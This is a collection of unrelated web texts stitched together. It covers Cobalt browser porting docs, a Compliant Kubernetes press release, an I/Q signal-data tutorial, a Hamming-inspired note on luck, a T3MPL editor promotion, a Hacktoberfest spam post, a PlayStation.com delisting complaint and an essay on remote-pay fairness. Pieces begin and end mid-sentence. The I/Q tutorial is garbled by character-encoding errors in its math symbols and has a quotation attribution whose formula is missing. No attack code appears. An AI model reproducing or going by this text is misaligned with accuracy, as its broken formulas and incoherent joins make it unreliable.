<li><p><strong>Porters</strong> enable Cobalt to work on other platforms by using Starboard,
Cobalt's porting layer and OS abstraction, to implement the
platform-specific functionality that Cobalt uses. Each Starboard module
(memory, socket, thread, etc.) defines functions that must be implemented
for the porter's platform.</p></li>
<li><p><strong>Developers</strong> want to build applications in familiar environments with
advanced debugging tools without having to worry about compatibility with
a highly fragmented set of browsers. At the same time, they want to have
full control over their codebase so that they can ship features for
constrained platforms, like TVs, on time and without technical risk.</p></li>
</ul>

<h2 id="benefits-of-cobalt">Benefits of Cobalt</h2>

<p>Cobalt significantly reduces the cost of supporting a browser on non-standard
and resource-constrained platforms. In addition, since Cobalt operates at a
consolidated, versioned platform abstraction layer, its porting effort is
man-weeks, and subsequent rebases are near-free.</p>

<p>These are some other benefits that Cobalt provides:</p>

<ul>
<li><p><strong>More platforms</strong></p>

<ul>
<li>  Cobalt does not require platforms to support JIT compilation and can
run on platforms that disallow execution of dynamically generated code.</li>
<li>  Cobalt is a single-process application and does not rely on the ability
to spawn multiple processes.</li>
<li>  Cobalt precompiles a set of shaders that are sufficient to express all
graphical effects, thereby accommodating platforms that cannot compile
shaders at runtime.</li>
<li>  Cobalt requires a compliant C++11 compiler, allowing it to reach
platforms with toolchains that don't support the newest C++17 features.</li>
</ul></li>
<li><p><strong>Small footprint</strong></p>

<ul>
<li>  Cobalt is optimized for memory. Its surface cache never exceeds a
predefined budget, and it never creates duplicate layers, reducing
the likelihood of out-of-memory crashes.</li>
<li>  Cobalt's small binary is designed to take up as little space as
possible. By supporting a subset of HTML5/CSS/JS, Cobalt's reduced
package size even allows bundling of CJK fonts on low-end devices.</li>
</ul></li>
<li><p><strong>Reduced input latency</strong></p>

<ul>
<li>  Cobalt produces consistent 60FPS animations by only supporting
animation of properties that don't affect layout, like <code>transform</code>,
and always running animations on a separate thread.</li>
<li>  Cobalt is optimized to run on single-core CPUs, resulting in better
input latency since the renderer and resource loader do not compete
with layout operations.</li>
<li>  On platforms that support GLES2, Cobalt avoids CPU painting by
performing almost all rendering operations on the GPU.</li>
</ul></li>
</ul>

<h2 id="getting-started">Getting started</h2>

<h3 id="porters">Porters</h3>

<p>Porters should begin with the <a href="https://cobalt.foo/starboard/porting.html">porting guide</a>,
which explains how to use Starboard, Cobalt's porting layer, to customize the
platform-specific functionality that Cobalt uses. There are several reference
documents to help porters customize configuration files and to implement
module-specific functionality. The <a href="https://cobalt.foo/starboard/testing.html">Testing with
NPLB</a> document provides an overview of
Starboard's compliance test suite.</p>

<h3 id="developers">Developers</h3>

<p>Developers can follow the setup instructions for
<a href="https://cobalt.foo/development/setup-linux.html">Linux</a> or
<a href="https://cobalt.foo/development/setup-raspi.html">RasPi</a> to set up their Cobalt development
environment, fetch a copy of the Cobalt code repository, and build a Cobalt
binary. The <a href="https://cobalt.foo/development/reference/supported-features.html">Cobalt support</a>
guide lists the HTML elements, CSS properties, CSS selectors, and JavaScript Web
APIs that developers can use in their Cobalt applications.</p>

Compliant Kubernetes is the first Open Source distribution of Kubernetes specifically designed to address HIPAA, GDPR, CCPA, PCI-DSS, SOC2 and ISO-27001 requirements and now gives individuals and enterprises a fully Open Source solution to address the growing privacy&nbsp; and regulatory demands facing every company delivering Cloud Native solutions.&nbsp;</span></p><p><span>Johan Tordsson, co-founder and CTO of Elastisys said: </span></p><blockquote><p><span>“I’m extremely proud of the great work done by the contributing engineers, coming together as a team to deliver Compliant Kubernetes. The work that has been done will dramatically simplify the implementation of critical compliance needs while preserving the benefit and agility of Kubernetes.”</span></p></blockquote><p><span>Compliant Kubernetes is much more than just Kubernetes. It is a combination of effective open source solutions from the cloud-native community developed to address the key security and access controls needed to meet regulatory compliances. These include:</span></p><ul><li><span>Dex</span><span>: a federated OpenID Connect-compatible identity provider, enabling authentication via, e.g., Active Directory, LDAP, and Google accounts. Dex-issued user identities are used for audit logging and Role-Based Access Control (RBAC) purposes throughout Compliant Kubernetes;</span></li><li><span>Harbor (with Trivy)</span><span>: a private container image registry with vulnerability scanning capabilities, protecting against known threats;</span></li><li><span>Open Policy Agent</span><span>: a cloud-native policy enforcement software, which Compliant Kubernetes configures to automatically enforce controls from various regulations, protecting against misconfiguration errors; and</span></li><li><span>Falco</span><span>: a configurable intrusion detection system (IDS), protecting against unknown threats and hacking attempts.</span></li></ul><p><span>For platform and application observability, Compliant Kubernetes packages and configures:</span></p><ul><li><span>Fluentd, Elasticsearch, and Kibana</span><span>: the high-performance fluentd log forwarding agent ships application and audit logs to a highly secured Elasticsearch instance, powered by the fully open source Open Distro for Elasticsearch. Users can work with these logs via the Kibana interface;</span></li><li><span>Prometheus, Grafana, and AlertManager</span><span>: Compliant Kubernetes uses the community standard monitoring stack, in which Prometheus scrapes and stores metrics and Grafana lets operators create dashboards to monitor Key Performance Indicators (KPI). AlertManager enables operators to get notified via various integrations when KPIs indicate actionable events or application states.</span></li></ul><p><span>Compliant Kubernetes additionally packages networking security-related features, such as the Calico networking provider, NGINX as a high-performance traffic ingress controller, and automatic certificate management via cert-manager. Thus, Compliant Kubernetes is a platform built for regulatory compliance from the ground up. It allows users to meet their needs and easily manage their Kubernetes environment across any supported public cloud, private set of virtual machines (VMWare), or bare metal servers.&nbsp;</span></p><p><span>For customer convenience and peace of mind, Elastisys offers a managed service in public clouds under either US or EU jurisdiction. Tempus AB is a current user of Compliant Kubernetes via Elastisys’ managed services and says: </span></p><blockquote><p><span>“We handle very sensitive data. We decided on Elastisys Compliant Kubernetes as it doesn’t lock you into any cloud, is available under European jurisdiction, is built on best practice from the cloud native community and comes pre-configured for all our security and compliance needs, saving us a lot of effort.”&nbsp;</span></p></blockquote><p><span>Robert Winter, CEO of Elastisys emphasizes Elastsys’ commitment Open Source: </span></p><blockquote><p><span>“Elastisys started the CK8s project because we needed a completely compliant solution to run our Managed Services, but we know the greatest power of Open Source is building a community to share and grow the solution”. </span></p></blockquote><p><span>Robert continues: </span></p><blockquote><p><span>“We stand ready to help any interested party with our Managed Services and support of CK8s, but we also are excited to nurture a healthy and growing community of Open Source users and contributors.”&nbsp;</span></p></blockquote><h2>About Elastisys</h2><p><span>Elastisys develops and manages open source platforms for modern, container based application development.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">
<p>This is a description of using I/Q Data (aka "analytic signal") representing a signal. Since the topic may be quite confusing, I've described the same thing here from different point of views. If you find the information somewhat redundant, it is because it is. Different views may appeal to different readers, and if something seems unclear, keep on reading and it may be more comprehensible later - hopefully.
</p>
<h2>Why I/Q Data?</h2>
<p>I/Q Data is a signal representation much more precise than just using a series of samples of the momentary amplitude of the signal. Have a look at the following signal below.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/cosample.png" alt="Plain signal" title="Plain signal"></p>
<p>This is what you may be used to work with. So why I/Q Data - isn't this good enough?
</p>
<p>Not really. We have a few problems here.
</p>
<ul><li>First, it is impossible to determine the frequency of this signal. Sure, it looks simple enough, just look at the period length? True, but you have no clue if it's a positive or negative frequency since they both generate the same curve. I.e. cos(x) = cos(-x). This becomes a problem working with the signal. Mixing (multiplying) two signals and it'll cause multiple solutions due to the uncertainty of the sign: f1 âŠ— f2 equals f1 + f2 as well as f1 - f2.
</li><li>Second, it's hard to determine the power (peak amplitude, envelope) of the signal. Basically you can only see the peak amplitude here at 0Â°, 180Â°, 360Â° etc, and how do you know the power is the same everywhere else as well? And did you sample the signal exactly at its peak? You really don't know.
</li></ul><p>I/Q Data solves this. Instead of looking at the signal as a flat curve as above, look at it as a corkscrew (helix, spiral, coil spring) in three dimensions.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkscrew.png" alt="Complex signal" title="Complex signal"></p>
<hr>
<p>Now if you look at this curve from the side, you'll actually get the same graph as the first one above. Your "real" signal actually is this 2D projection of this corkscrew signal. This is your "I" in I/Q data.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkI.png" alt="Side view" title="Side view"></p>
<hr>
<p>Now have a look at the corkscrew from above. This looks quite similar, but as you see, it is out of phase 90Â°  starting at zero, not at one as the other. This this the Q part of your I/Q data.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkQ.png" alt="Top view" title="Top view"></p>
<hr>
<p>Now looking at the corkscrew down the time axis you'll see it winds counter-clockwise. This means we know the frequency is positive. It could have wound clockwise as well, still generating the same I-signal (projection) but different Q-signal, representing a negative frequency.
</p>
<p>You also see that the radius of the corkscrew is constant at every sample, if small in I large in Q and vice versa. The radius is the peak amplitude of your signal. 
</p>
<p>The axes are of course 90Â°, so the radius must be equal to (IÂ²+QÂ²)<sup>1/2</sup>. This is the peak amplitude of your signal, and as you can see you know this for each and every sample.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkT.png" alt="Viewed down time axis" title="Viewed down time axis"></p>
<h2>What is I/Q Data?</h2>
<p>AS you now understand, the I/Q Data Sample is the coordinates of your signal as seen down the time axis of the corkscrew.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/onesample.png" alt="" title=""></p>
<p>You might object that your signal isn't a pure cosine function as the one we have shown here, and it might be very true. Still, every single sample of your signal can be described as such, i.e. with a peak amplitude times cosine of some phase angle.
</p>
<p>Every single point of your signal can be described as the function Aâ‹…cos(Ï•)
</p>
<p>Since you may freely chose any amplitude A and angle Ï• this must of course be true (as long as the signal is continuous). The value of Aâ‹…cos(Ï•) is the <strong>I</strong> component of the I/Q signal, i.e. your real signal. Note that this only describes your signal in one single point, i.e. one sample. Next sample gives you a new I and Q very likely resulting in another amplitude and/or phase angle, reflecting the modulation of the signal.
</p>
<h2>One sample I/Q Data</h2>
<p>Ok, lets take one sample of I/Q Data and see what it represents. This is also called a phase vector, or phasor.
</p>
<pre>I = 0.69
Q = 0.40
</pre>
<p>Lets draw this in the complex plane.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/iqdraw1.png" alt="" title=""></p>
<p>Lets see what this tells us about our data point.
</p>
<ul><li>The momentary amplitude of our real signal is by definition <strong>I</strong>, i.e. 0.69
</li><li>Pythagoras tells us the amplitude A of the cosine wave is <code>(0.69Â²+0.40Â²)<sup>1/2</sup> = 0.8</code>
</li><li>Trigonometry tells us our angle is +30Â° into our cosine wave.
</li></ul><p>- <em>Hold it</em>, you say, <em>what cosine wave?</em>
</p>
<p>Well, I/Q actually assumes your real signal (<strong>I</strong>, that is) can be described as the
function <strong>I</strong> = Aâ‹…cos(Ï•)
</p>
<p>Since you are free to chose A and Ï• this must of course be true, as long the function is continuous. Remember we are looking at one single sample now, i.e. one point in time.
</p>
<p>So by using IQ Data we not only get the momentary values of our signal, but the function generating it as well. If we put above together we get:
</p>
<p>The real signal I = 0.8â‹…cos(30Â°)
</p>
<hr>
<ul><li>I/Q Data is the representation (data type) of this cosine function.
</li></ul><p>I/Q Data is the rectangular representation of the polar notation we used above. There is a unique transformation between the two, and the different notations have different properties calculating with them. The rectangular form of I/Q Data is chosen due to the ease of hardware implementations of the most common operations.
</p>
<p>I/Q Data consists of I and Q represented as two separate variables, a vector of length two, or more often, the complex number  I + Q<em>i</em>  (yes, I is the real part).
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/polrep.png" alt="" title=""></p>
<p>Note that the Amplitude above is the waves peak amplitude, not the momentary amplitude.
</p>
<ul><li>I is the current momentary amplitude of the signal (i.e. the Real signal)
</li><li>Q is the momentary amplitude of the signal phase shifted -90Â°.
</li></ul><p>For a simple function such as sine, the phase shift is what the signal was earlier in time, but for a signal with more than one sine component, Q reflects a -90Â° shift of the individual components, and not the composite signal as such. To convert a Real Signal to a I/Q Data Signal, discrete Fourier transformation is required (Hilberts transform).
</p>
<h2>Different ways of representing the same I/Q Data Sample</h2>
<p>There are at least three common ways to represent the I/Q Data Sample. Different representations gives you different pros and cons. Some are more easy to add, other are more easy to multiply etc. This may be important in the implementation, resulting in less complex hardware/software using the best representation.
</p>
<h3>The rectangular form</h3>
<p>The I/Q Data on the form Q and I is called "rectangular" (or "Cartesian") form as it can be viewed as positions in a coordinate system. I and Q are the x and y axis respectively. This is the most common representation you are used to. This form is most common due the ease of modulating/demodulating it in hardware. More about that later.
</p>
<ul><li>As a complex number: I + Q<em>i</em>
</li><li>As a vector [I,Q]
</li><li>Or just the two plain variables I and Q
</li></ul><h3>The polar form</h3>
<ul><li>Amplitude and angle
</li></ul><p>I = Amplitudeâ‹…cos(angle) <br>Q = Amplitudeâ‹…sin(angle)
</p>
<p>The Amplitude is the peak amplitude of the cos (and sin) function, and the angle is how far into the period from zero to 360Â° you are (or 0 to 2Ï€ if you prefers radians).
</p>
<h3>Eulers form</h3>
<p>Since cos(Ï•) + iâ‹…sin(Ï•) = e<sup>iÏ•</sup> we can write our IQ sample as
</p>
<p><span> Ae<sup>iÏ•</sup> </span>
</p>
<p>This might (not?) be the most intuitive representation of the sample. Ï• rotates the angle as seen in the polar representation, and A is of course the amplitude. Realizing this, Eulers identity becomes obvious. Because Ï• is the rotation of the vector in the complex plane, rotating it half a turn, 180Â° or Ï€ radians, results in a real part of -1 and no imaginary part, hence:
</p>

</p>
<p><em>-- Carl Friedrich Gauss </em>
</p>
<h2>Positive versus negative frequency</h2>
<p>It is now easy to see that using I/Q we can represent the signal frequency either as positive or negative. Have a look at the two I/Q signals red and blue below to the left and compare them with their corresponding real projections. It is as obvious they differ in signs in I/Q, as it's impossible to determine the signs using only the real signal component (neither the I nor the Q projection separately).
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/freqsign.gif" alt="Positive versus negative frequencies" title="Positive versus negative frequencies"></p>
<p><span>(sidenote: I've put them slightly out of phase compared to each other since else they wouldn't be possible to distinguish at all in the real representation to the right. Also, please note I'm here, quiet unconventional, using the x axis in the phasor for the imaginary <strong>Q</strong>)</span>

<p>The <strong>I</strong> components (side view):

As the Nyquistâ€“Shannon sampling theorem states you can only represent
frequencies up to <code>f/2</code> using a samplings rate of <code>f</code>. This is still true
using IQ Data, but since you now can represent negative frequencies
the signal spans <code>[-f/2..+f/2]</code> compared to <code>[0..+f/2]</code> using a â„�eal signal,
hence the range is in effect doubled. Using a
sampling rate of <code>f</code> and you now can represent a signal range of <code>f</code> as well.
Two to the price of one!
</p>
<h2>Mixing and multiplying signals</h2>
<p>Using real signals or IQ Signals gives different results when you multiply them. This is because using only the real component it's not possible to uniquely determine the phase angle of the signal, hence impossible to distinguish a positive frequency from a negative.
</p>
<p><span><img src="http://whiteboard.ping.se/uploads/SDR/mix-real.png" alt="Mixing 10 kHz with 3 kHz using real" title="Mixing 10 kHz with 3 kHz using real"></span></p>
<p>Multiplying two signals f1 and f2 in the real domain:
</p>
<p><span> Â±f1 âŠ— Â±f2 = (Â±)f1 Â± f2 </span>
</p>
<p><span><img src="http://whiteboard.ping.se/uploads/SDR/mix-iq.png" alt="Mixing 10 kHz with 3 kHz using I/Q" title="Mixing 10 kHz with 3 kHz using I/Q"></span></p>
<p>Using IQ Data the signs are now given, and the result is unambiguous:
</p>
<p><span> f1 âŠ— f2 = f1 + f2 </span>
</p>
<p><br>
A frequency spectrum in the real domain usually never show the negative side, since it always must be symmetric around zero due to the uncertainty of the sign of the frequency of the real signal -- hence the parentheses around the sign of <code>f1</code> in the first formula mixing the real signals. I've included the negative side here for illustrative purposes, despite of its redundancy.
</p>
<p>Multiplying two complex number is easiest understood in the polar representation. The amplitude is multiplied and the angle added.
</p>
<p><span> A<sub>1</sub>â‹…e<sup>iÏ•<sub>1</sub></sup>â‹…A<sub>2</sub> e<sup>iÏ•<sub>2</sub></sup> = A<sub>1</sub>A<sub>2</sub> e<sup>i(Ï•<sub>1</sub>+Ï•<sub>2</sub>)</sup> </span>
</p>
<p>Realizing the angle is added under multiplication makes it obvious that the frequencies are added as well.
</p>
<h3>And in time domain ...</h3>
<p>Now let us have a look at this in time domain. To make it easier (doable!) to calculate the DFT in our …</p></div></div>

		<p>It’s a multiplication of <code>x</code> and <code>y</code>.</p>
<p><code>x</code> is how much you are prepared, <code>y</code> is how lucky you are.</p>
<p>You are responsible for the <code>x</code> part of the equation, the <code>y</code> takes care of itself. If your preparation effort is zero, all the potential opportunities will be multiplied by zero and you will lose every one of them, no matter how big they were.</p>
<p>The more prepared you are, the more lucky you become. It’s not because you are lucky, rather because you can multiply small opportunities by big factors.</p>
<hr>
<p>This idea is inspired by Richard W. Hamming’s thoughts on luck, mentioned in his book, <a href="https://msjaber.com/books/the-art-of-doing-science-and-engineering-learning-to-learn/">The Art of Doing Science and Engineering</a>. He walks through all the coincidences that led him to his discoveries. Those coincidences have occured for many people – none of them were prepared, only Hamming was.</p>
<p>Could you have discovered what Hamming did if you were in his position? Yes, only if you were prepared.</p>

		<p><img src="https://t3mpl.n4no.com/content/image/5841gmvz8i7y8mycchzx.png" alt="Generate Website Admin Panel"></p>

<p>Creating admin panel for small website is an expensive thing. Each site has a different structure, and it needs different admin sections. This site has a news section, that doesn't. This site has a landing page with five texts, that site has only one image there. Familiar?</p>
<p>The popular choice to reduce a cost is use Wordpress. But Wordpress is dedicated to blog/news websites. Any deviation from the general purpose of Wordpress means a problem. Of course the market has many plugins and extensions to solve that. Unluckily joining together many elements are difficult and problematic.</p>
<p>So what to do? You may use T3MPL. T3MPL is the generic website editor and the static website generator in one. <strong>When you prepare a template, T3MPL automatically generates editor for your template.</strong></p>
<h4 id="🎹-template-contract">🎹 Template Contract</h4>
<p>Look at <strong>the template contract</strong> bellow. What is it? It is a definition of a data structure in your template. To define that it's needed to create a simple YAML file (template.yaml).</p>
<pre><code>dataContract:
  LANDING:
    sections:
      APP:
        properties:
          TITLE:
            type: (text)
            defaultValue: Hello World
          DESCRIPTION:
            type: (markdown)
            defaultFilePath: content/app-description.md
          PREVIEW:
            type: (image)
            defaultFilePath: assets/app-preview.jpg
            width: 1084
            height: 840
...</code></pre>
<h4 id="👓-template">👓 Template</h4>
<p>You can use that data directly in a template file. Templates are powered by <a href="https://github.com/handlebars-lang/handlebars.js">handlebars</a>.</p>
<pre><code>&lt;div class="landing"&gt;
  &lt;h3&gt;{{LANDING.APP.TITLE}}&lt;/h3&gt;

  {{{$markdown LANDING.APP.DESCRIPTION}}}

  &lt;img src="{{{$image LANDING.APP.PREVIEW}}}" alt="..." /&gt;
&lt;/div&gt;</code></pre>
<h4 id="💥-generic-editor">💥 Generic Editor</h4>
<p>You have everything now. <strong>T3MPL automatically generates an editor for your template.</strong> You may edit your website with live preview now.</p>
<p><img src="https://t3mpl.n4no.com/content/image/xjwaxgk21nnqo5ton12x.png" width="270"></p>

<h4 id="🚀-publishing">🚀 Publishing</h4>
<p>When you finish editing, you may want to publish your website. You can do that in two ways.</p>
<ul>
<li><strong>Publish to .zip file</strong> - T3MPL generates your final website to .zip file. You should upload website files to your server. In this case, your server doesn't have special requirements like PHP or Ruby. Generated files should work on the most popular servers like Apache, Nginx and IIS.</li>
<li><strong>Use T3MPL Server</strong> - if you want to modify your website in a more professional way, you can use T3MPL Server. It requires Node.js on your server. The server allows you to modify your website directly from the editor. In this case, if you click the "publish" button, all changes will be published immediately.</li>
</ul>
<p>So you can use T3MPL according to how often you change your site.</p>
<p>If you have a template and a data you may also generate your website by T3MPL Cli.</p>
<h4 id="📣-summary">📣 Summary</h4>
<p>T3MPL provides a very simple concept, how to connect the data structure, the template and the editor. With T3MPL you don't care about the admin panel because T3MPL creates the admin panel when you create a website template. This saves time a lot. And money.</p>

Still, better late than never, and the event has become such a phenomenon I’m happy I did finish the challenge (or like DigitalOcean calls it – the celebration)! The event has a special place in my heart, as it did (in 2017, I think?) encourage me to contribute more to the community – not only by maintaining this blog but also by occasionally submitting a Pull Request or two to whatever repositories I’ve found useful in my work.<span data-ez-name="koskila_net-box-3"></span></p><p>This year, however, I was more on the fence than ever before. Last year, there had been some complaints about the spamminess of the event; that it encourages quantity over quality. No matter whether your PRs (Pull Request) are accepted or not, you’ll get your shirt. It’s actually easy just to spam a few readme.md updates and be done with it.<span data-ez-name="koskila_net-medrectangle-3"></span></p><p>But this year, the problem got completely out of control. Twitter became kind of crazy with plenty of users tweeting about the absolutely useless pull requests their repositories were bombarded with.</p><p>Examples to follow:</p><figure><figcaption>Source: https://twitter.com/ShivamJoker/status/1314783210836955142?s=19</figcaption></figure><p><a href="https://twitter.com/hashtag/shitoberfest" target="_blank" rel="noreferrer noopener nofollow">#shitoberfest</a> started trending on Twitter.

            <div>
                
<p>The heartbreak continues for those of us that relied on Sony’s websites to find and buy games or to research what was available. After <a href="https://delistedgames.com/sony-makes-it-official-playstation-3-psp-vita-removed-from-psn-website-between-october-21-and-26/">cutting out</a> older PlayStation content from the PlayStation Store over the past month, Sony’s eye has seemingly fallen on PlayStation.com and I find myself feeling gutted this morning. For those who didn’t use it regularly, PlayStation.com housed a gargantuan history of pages for North American PlayStation releases going all the way back to the original console from 1995. Up until this week you could easily find titles using the search box on the site but now anything before the PlayStation 4 returns a disappointing “<em>0 results found</em>“.</p>



<p>The older pages weren’t overflowing with info but they did offer some product details that I couldn’t easily find elsewhere. For newer games these pages also frequently retained links to the PlayStation Store which helped in my research. Even when they <em>were</em> on sale some games were just hard to find on the PlayStation Store while their PlayStation.com pages linked directly to them. Sometimes these pages were among the scant bits of evidence that I could find to confirm these games even existed digitally. Now, like with the changes to the PlayStation Store, all that’s gone too. Well, mostly gone.</p>



<p>Thankfully, like our “<a href="https://delistedgames.com/get-the-old-playstation-store-back-for-now/">old PS Store</a>” workaround, there’s still a way to search PlayStation.com but it might also eventually go away. Google’s “search within a site” function has been around for nearly a decade at this point but I’m sure lots of people don’t even know it exists. For our purposes just head to <em>the Google</em>, type ‘site:playstation.com’ and then whatever game you’re looking for. You can use Google’s other search operators to refine the results as well. Put it all together and it looks something like this: <strong>site:playstation.com “age of booty”</strong></p>



<p>You’ll get search results across the playstation.com domain including PlayStation Blog posts and PlayStation Store pages but look for the ones that specifically state ‘www.playstation.com’. In the case of Age of Booty the page gives us a description and even some screenshots as well as a ‘Buy Download’ link. Of course, the download page has been hidden by Sony’s recent changes to their sites but the URL remains accessible so you can check other territories or check it out using the “<a href="https://delistedgames.com/get-the-old-playstation-store-back-for-now/">old</a>” method. Yes, <a href="https://delistedgames.com/age-of-booty/">Age of Booty</a> is still delisted on PlayStation 3.</p>



<p>Maybe it was just a feature that only <strong><em>I</em></strong> benefited from but it’s really sad to see Sony ostensibly kill 25 years of PlayStation content on the web. It makes the nostalgia trip of Astro’s Playroom feel a little more hollow.</p>

            <p>Tough questions to ask your remote employer who gives you Cost Of Living based compensation and some thoughts on how remote compensation will work in the future</p>
    </header>

    <!--<div class="image main"><img src="/content/images/2020/06/micheile-henderson-03NMNUqHPdE-unsplash.jpg" alt="You should expect &quot;equal pay for equal work&quot; at your new remote job" /></div>-->

        <figure><img src="https://www.nityesh.com/content/images/2020/06/micheile-henderson-03NMNUqHPdE-unsplash--1-.jpg" alt=""></figure><blockquote>Your star designer out in the sticks is just as valuable (maybe more so) to the team as those working from the big-city home office. Make sure she feels that way. <p>By the same token, as a remote worker, you shouldn’t let employers get away with paying you less just because you live in a cheaper city. “Equal pay for equal work” might be a dusty slogan, but it works for a reason. If with regard to compensation you accept being treated as a second-class worker based on location, you’re opening the door to being treated poorly on other matters as well.</p><p>- <a href="https://www.nityesh.com/books-read/#remote-office-not-required-by-david-heinemeier-hanson">Remote</a> by David Heinemeir Hanson and Jason Fried</p></blockquote><p>Almost all the knowledge jobs have become work-from-home in this sudden pandemic. Societies, companies, employees and job-seekers - all have been caught in this sudden shift in the way of working.</p><p>I am writing this for the new job-seekers. It's a tough market out there but you should still expect "equal pay for equal work" at whatever remote company you work for in the future. Most of us will probably not get it anytime soon but I believe that there's value in setting expectations.</p><h2 id="tough-questions-against-cost-of-living-col-based-adjustments">Tough questions against Cost Of Living (COL) based adjustments</h2><p>Big companies like Twitter, Shopify and Facebook have announced that they are adopting remote work for good. It's inevitable that this will pave the path for other companies to follow suit. </p><p>But along with this they might also make location based compensation the norm.</p><figure><blockquote><p lang="en" dir="ltr">Wait what? Facebook is seriously going to dunk someone's salary if they move? That's barbaric. <a href="https://t.co/xoV5XpstH3">https://t.co/xoV5XpstH3</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1263544194359947264?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><p>Below I present some tough questions that you can ask your employer who has adopted this practice.</p><h3 id="-1-opening-the-doors-to-discrimination-at-work">#1. Opening the doors to discrimination at work</h3><p>If you don't live in the highest wage city of the world, you might have a peer at the company who lives in a more expensive city than you. Are you ready to be treated as a second-class employee just because of the geography that you live in?</p><p><em>How will you know that all the lousy work doesn't get passed on to you because it is justified in terms of 'returns on investment'?</em></p><p>When your manager has the final say, isn't it possible that they distribute work so that a low-risk, low-impact project is assigned to you while your "more expensive" peers get assigned the high-risk, high impact one?</p><p><strong>HR at your COL company</strong><em>: "We have a policy that says we won't discriminate based on the employee's location."</em></p><p>That's all well and good but what about the silent bias.</p><p><em>How can you be sure that your extremely well-meaning manager wasn't thinking about it when they assign you a project that you don't like? Wouldn't they be making a wise decision that is justified in terms of returns of investment? Can you be sure that they won't?</em></p><h3 id="-2-differences-in-government-spending-across-countries">#2. Differences in Government spending across countries</h3><p>Public spending enables governments to produce and purchase goods and services, in order to fulfil their objectives – such as the provision of public goods or the redistribution of resources - like social protection, education and healthcare.</p><p>Recent data on public spending reveals substantial cross-country heterogeneity. Relative to low-income countries, government expenditure in high-income countries tends to be much larger (both in per capita terms, and as share of GDP), and it also tends to be more focused on social protection.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Yes! In Spain families with more than 2 children also get benefits from the government, but they have nothing to do with your employer.</p>— Rosa (@rosapolis) <a href="https://twitter.com/rosapolis/status/1264238728123465728?ref_src=twsrc%5Etfw">May 23, 2020</a></blockquote>

</figure><p>In India, the government spent about 1,700 US dollars per head (adjusted based on Purchasing Power Parity) in the year 2015; while in countries such as Norway, that figure was over 30,000 US dollars (adjusted based on PPP) and in USA it was over 21,000 USD.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Source: <a href="https://ourworldindata.org/government-spending">https://ourworldindata.org/government-spending</a></p><p>This lack of government spending is ultimately passed on to the citizens who need to pay for these benefits with their own money, thus reflecting it in their costs of living.</p><p>An impotent public schooling system means that employees need to send their children to expensive private schools. A broken public hospital infracture means that people need to avail the expensive private hospitals for their healthcare. And a lot of these private enterprises are not above profiteering in times of crises.</p><p><em>How does cost of living based compensation take into account the differences in government spending accross countries? Shouldn't the employees be compensated for this difference?</em></p><h3 id="-3-relocations-get-complicated-at-best-and-outright-unfair-at-worst">#3. Relocations get complicated, at best and outright unfair, at worst</h3><p><em>What happens if I relocate to a lower paid region? Will I be compensated differently?</em></p><p>Companies like GitLab are pretty transparent about this. <a href="https://about.gitlab.com/handbook/total-rewards/compensation/#relocating">"Yes, you take a pay cut."</a></p><p><em>But what happens if I was living in a cheap city and decide to move to a more expensive one?</em></p><p>I asked the CEO of Gitlab. Here's what he replied -</p><figure><blockquote><p lang="en" dir="ltr">I don’t remember ever declining such a request.</p>— Sid Sijbrandij (@sytses) <a href="https://twitter.com/sytses/status/1264219857609912320?ref_src=twsrc%5Etfw">May 23, 2020</a></blockquote>

</figure><p>Coming from India, I know for a fact that a lot of people in lower-income countries will jump at this opportunity.</p><p><em>What happens if I choose to be a digital nomad changing cities every couple of months?</em></p><p><em>What if I choose to get an official address in some expensive city while I actually live in the suburbs?</em></p><h3 id="-4-loose-definition-of-cost-of-living">#4: Loose definition of "Cost of Living"</h3><p>The most common arguement against "equal pay for equal work" for remote employees is the difference in housing prices across cities/countries.</p><figure><blockquote><p lang="en" dir="ltr">But those COL adjustments are meant to reflect the local reality no (the house I live in here in SF will a lot cheaper in the middle of nowhere )? Assuming you have the same pool of money to pay people, how do you make sure people have the same experience regardless of place?</p>— Sriram Krishnan (@sriramk) <a href="https://twitter.com/sriramk/status/1263541004289753088?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><p>So, how do you define the "Cost of Living"?</p><p>Is it just the housing prices? And groceries? Restaurant bills, maybe?</p><p>That seems incomplete. It is only a small percentage of a lot of people's actual costs of living.</p><p>What about living with an elderly parent?</p><p>What about living a single life vs. being married? For that matter, how about having a stay-at-home spouse vs. having a spouse in a high-paying job?</p><p>What about the number of kids one has?</p><p>Number of dogs? Cats?</p><p><em>What's included in "Cost of Living"? </em></p><p><em>More importantly, who defines it? Should it be the employee who is actually incurring these costs? Or should it be the employer who is paying the employee?</em></p><figure><blockquote><div lang="en" dir="ltr"><p>If you’re going to pay people differentially based on where they choose to live, why not pay them differentially based on whether they have kids, too?</p><p>These little monsters are expensive, after all. I’ve got costs!</p></div>— Blair Reeves (@BlairReeves) <a href="https://twitter.com/BlairReeves/status/1263527961371738112?ref_src=twsrc%5Etfw">May 21, 2020</a></blockquote>

</figure><h3 id="other-tough-questions">Other tough questions</h3><ul><li><em>Who dictates the proportion in which I should be spending my money?</em></li></ul><p>Electronic devices from big brands are priced the same regardless of whether they are sold in the USA or Brazil. A Macbook would cost you the same every city of the world (except for the import duties that people outside the USA probably need to bear).</p><p>So, what if I choose to spend just 10% of my income on housing expenses and 30% surrounding myself with the latest tech gadgets from the world? And maybe another 40% investing in NASDAQ stocks?</p><p>It sure doesn't make sense to have a 100% of my salary reduced based on just 10% of my expenses.</p><ul><li><em>Where does the leadership in the company live? </em></li></ul><p>Leadership in companies that offer COL based compensation, often live and work in high-wage markets but they might feel differently if they were subject to lower pay for the same work.</p><ul><li><em>How do you account for the costs of reduced opportunities that employees, who don't live in primary talent markets, incur?</em></li></ul><p>People who don't live in the tech hubs of the world might have to bear costs in terms of reduced networking advantages and lesser alternate job opportunities.</p><hr><p>Unless a company is ready to give satisfactory answers to all such questions, it should default to equal 